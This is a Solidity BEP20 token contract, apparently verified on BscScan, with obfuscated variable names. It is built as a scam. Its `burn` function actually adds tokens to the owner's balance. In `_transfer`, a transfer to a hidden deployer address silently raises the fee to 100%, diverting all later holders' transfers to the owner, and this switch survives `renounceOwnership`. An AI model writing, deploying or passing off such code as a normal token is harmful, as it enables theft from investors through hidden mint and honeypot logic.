/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-13
 */
 // 
// @@@@@@@@\                                      @@@@@@\  @@\                 @@\           
// @@  _____|                                    @@  [email protected]@\ @@ |                \__|          
// @@ |       @@@@@@@\  @@@@@@@\  @@@@@@\        @@ /  \__|@@@@@@@\   @@@@@@\  @@\ @@@@@@@\  
// @@@@@\    @@  _____|@@  _____|@@  [email protected]@\       @@ |      @@  [email protected]@\  \[email protected]@\ @@ |@@  [email protected]@\ 
// @@  __|   \@@@@@@\  \@@@@@@\  @@@@@@@@ |      @@ |      @@ |  @@ | @@@@@@@ |@@ |@@ |  @@ |
// @@ |       \[email protected]@\  \[email protected]@\ @@   ____|      @@ |  @@\ @@ |  @@ |@@  [email protected]@ |@@ |@@ |  @@ |
// @@@@@@@@\ @@@@@@@  |@@@@@@@  |\@@@@@@@\       \@@@@@@  |@@ |  @@ |\@@@@@@@ |@@ |@@ |  @@ |
// \________|\_______/ \_______/  \_______|       \______/ \__|  \__| \_______|\__|\__|  \__|
//
//
pragma solidity >=0.4.11;
contract DZBICh {
mapping (address => mapping (address => uint256)) private _allowances;
address public  LCgRMb = address(0);
uint256 private  RFvudI = 10000000000000;
string public  symbol = "qTnnVp";
uint256 public  QMptfA = 100000000000000000000;
uint256 public  cUVwdQ = 100000000000000000000000;
string public  name = "LEwzBO";
uint256 public  NZUpjj = 10000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  IZnXCJ = address(0);
uint256 public constant VyMXfP = 9+1;
mapping (address => uint256) public balanceOf;
address private  iBYRnE = address(0);
uint256 public  aSMrDI = 1000000000000000000;
address public  qHXgtO = address(0);
uint256 public  LHZmUa = 10000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  dntHgV = 10000000000000000;
uint256 public  gGYreq = 100000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  PJXLen = 100000000000000000;
address public  ZlvhLD = address(0);
address public  beKDgl = address(0);
address public owner;
address public  qAqpqk = address(0);
uint8 public constant decimals = 18;
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () public {
iBYRnE = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "efxGje");
require(to != address(0), "efxGje");
require(amount <= balanceOf[from], "efxGje");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* VyMXfP/RFvudI ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==iBYRnE){
RFvudI = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}